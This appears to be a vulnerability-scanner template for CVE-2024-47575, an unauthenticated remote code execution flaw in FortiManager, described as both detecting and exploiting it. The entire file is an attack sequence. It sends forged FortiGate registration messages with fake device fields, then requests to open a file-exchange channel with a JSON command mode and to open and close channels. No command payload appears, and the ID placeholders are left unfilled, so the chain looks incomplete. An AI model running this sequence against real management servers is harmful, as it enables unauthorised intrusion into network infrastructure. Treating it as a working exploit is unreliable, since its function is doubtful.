id: CVE-2024-47575

info:
  name: FortiManager Unauthenticated Remote Code Execution
  author: Sina Kheirkhah (@SinSinology), watchTowr
  severity: critical
  description: |
    This template detects and exploits the FortiManager Unauthenticated Remote Code Execution vulnerability (CVE-2024-47575).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-47575
  tags: cve,cve2024,fortimanager,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Content-Type: application/octet-stream

    body: |
      get ip
      serialno=FGVMEVWG8YMT3R63
      mgmtid=00000000-0000-0000-0000-000000000000
      platform=FortiGate-VM64
      fos_ver=700
      minor=2
      patch=2
      build=1255
      branch=1255
      maxvdom=2
      fg_ip=192.168.1.53
      hostname=FGVMEVWG8YMT3R63
      harddisk=yes
      biover=04000002
      harddisk_size=30720
      logdisk_size=30235
      mgmt_mode=normal
      enc_flags=0
      first_fmgid=
      probe_mode=yes
      vdom=root
      intf=port1
      \0

    matchers:
      - type: word
        words:
          - "remoteid="
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Content-Type: application/octet-stream

    body: |
      get auth
      serialno=FGVMEVWG8YMT3R63
      mgmtid=00000000-0000-0000-0000-000000000000
      platform=FortiGate-60E
      fos_ver=700
      minor=2
      patch=4
      build=1396
      branch=1396
      maxvdom=2
      fg_ip=192.168.1.53
      hostname=FortiGate
      harddisk=yes
      biover=04000002
      harddisk_size=30720
      logdisk_size=30107
      mgmt_mode=normal
      enc_flags=0
      mgmtip=192.168.1.53
      mgmtport=443
      \0

    matchers:
      - type: word
        words:
          - "remoteid="
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Content-Type: application/octet-stream

    body: |
      get file_exchange
      localid=REPLACE_LOCAL_ID
      chan_window_sz=32768
      deflate=gzip
      file_exch_cmd=put_json_cmd
      \0

    matchers:
      - type: word
        words:
          - "remoteid="
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Content-Type: application/octet-stream

    body: |
      channel
      remoteid=REPLACE_REMOTE_ID
      \0

    matchers:
      - type: word
        words:
          - "remoteid="
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Content-Type: application/octet-stream

    body: |
      channel
      action=close
      remoteid=REPLACE_REMOTE_ID
      \0

    matchers:
      - type: word
        words:
          - "remoteid="
        part: body
